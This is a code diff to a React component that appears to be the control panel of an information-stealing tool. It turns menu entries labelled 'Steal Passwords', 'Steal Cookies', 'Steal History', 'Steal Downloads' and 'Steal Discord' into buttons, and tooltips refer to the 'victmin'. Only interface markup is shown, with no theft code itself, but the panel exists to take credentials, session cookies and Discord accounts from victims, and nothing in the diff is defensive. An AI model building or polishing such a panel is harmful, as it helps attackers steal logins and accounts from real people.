@@ -418,31 +418,56 @@ export default function Component() {
                   className="no-underline"
                   title="Here you can steal the user Passwords"
                 >
-                  <p onClick={handleOpenModalSenha}>Steal Passwords</p>
+                  <button
+                    className=" text-white font-normal px-4 py-2 rounded"
+                    onClick={handleOpenModalSenha}
+                  >
+                    <p>Steal Passwords</p>
+                  </button>
                   <div>{isModalOpenSenha && <ModalPassowrds />}</div>
                 </abbr>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Cookies">
-                  <p onClick={handleOpenCookies}>Steal Cookies</p>
+                  <button
+                    className=" text-white font-normal px-4 py-2 rounded"
+                    onClick={handleOpenCookies}
+                  >
+                    <p>Steal Cookies</p>
+                  </button>
                 </abbr>
                 <div>{isCookiesOpen && <ModalCookies />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin History">
-                  <p onClick={handleOpenHistory}>Steal History</p>
+                  <button
+                    className=" text-white font-normal px-4 py-2 rounded"
+                    onClick={handleOpenHistory}
+                  >
+                    <p>Steal History</p>
+                  </button>
                 </abbr>
                 <div>{isHistoryOpen && <ModalHistory />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Downloads">
-                  <p onClick={handleOpenDL}>Steal Downloads</p>
+                  <button
+                    className=" text-white font-normal px-4 py-2 rounded"
+                    onClick={handleOpenDL}
+                  >
+                    <p> Steal Downloads</p>
+                  </button>
                 </abbr>
                 <div>{isDownloadsOpen && <ModalDownloads />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Discord">
-                  <p onClick={handleOpenDiscord}>Steal Discord</p>
+                  <button
+                    className=" text-white font-normal px-4 py-2 rounded"
+                    onClick={handleOpenDiscord}
+                  >
+                    <p>Steal Discord</p>
+                  </button>
                 </abbr>
                 <div>{isDiscordOpen && <ModalDiscord />}</div>
               </div>
